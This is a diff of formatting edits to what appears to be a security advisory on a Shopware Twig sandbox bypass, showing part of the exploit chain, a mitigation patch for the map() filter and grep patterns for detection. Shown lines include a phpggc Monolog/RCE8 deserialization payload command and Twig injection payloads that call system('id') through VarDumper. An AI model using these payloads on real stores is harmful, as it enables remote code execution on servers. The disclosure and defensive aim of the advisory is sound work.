@@ -157,7 +157,7 @@ Going back to [1], if $arrow is an array instead of a string or closure, the val
 
 #### Gadget 1: 
 Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
-Serialized payload generated using the phpggc tool: ./phpggc -b Monolog/RCE8 system `'id'`
+Serialized payload generated using the phpggc tool: ./phpggc -b Monolog/RCE8 system 'id'
 
 Compressed payload is generated using:
 
@@ -170,6 +170,9 @@ Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Compo
 
 ```
 {{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler']) | length }}
+```
+
+```
 {{ ['id'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'dump']) | length }}
 ```
 
@@ -213,6 +216,7 @@ $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | h
 ### Mitigations:
 Patch the logic flaw in the `SecurityExtension` function declared in `src/Core/Framework/Adapter/Twig/SecurityExtension.php` to ensure that the parameter passed to the respective filter functions must either be a `string` or a `Closure` as such:
 An sample patch is shown below for the map() filter:
+
 ```
     public function map(iterable $array, string|callable|\Closure $function): array
     {
@@ -235,4 +239,4 @@ The following strategies may be used to detect potential exploitation attempts.
 1. Searching within Twig cache/compiled Twig template files using the following shell command `grep -Priz -e '\|\s*(filter|map|reduce|sort)\s*\(' --exclude \*url_matching_routes.php /path/to/webroot/var/cache/`
 2. Searching within custom apps/plugins/themes using the following shell command `grep -Priz -e '\|\s*(filter|map|reduce|sort)\s*\(' /path/to/webroot/custom/`
 
-Note that it is not possible to detect indicators of compromise reliably using the Shopware log file (located at /path/to/webroot/var/log by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.
+Note that it is not possible to detect indicators of compromise reliably using the Shopware log file (located at `/path/to/webroot/var/log` by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.
